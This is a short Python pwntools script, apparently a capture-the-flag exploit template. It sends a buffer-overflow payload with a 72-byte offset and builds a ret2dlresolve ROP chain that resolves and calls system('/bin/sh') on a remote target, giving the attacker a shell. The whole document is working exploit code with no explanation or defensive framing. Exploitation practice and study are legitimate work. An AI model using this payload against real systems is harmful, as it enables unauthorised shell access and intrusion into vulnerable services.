from pwn import *

exe = None

offset = 72
total = 200

def pwn(r): # r is remote
    rop = ROP(exe)
    dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])
    rop.read(0, dlresolve.data_addr)
    rop.ret2dlresolve(dlresolve)
    raw_rop = rop.chain()
    r.sendline(fit({offset:raw_rop, total:dlresolve.payload}))

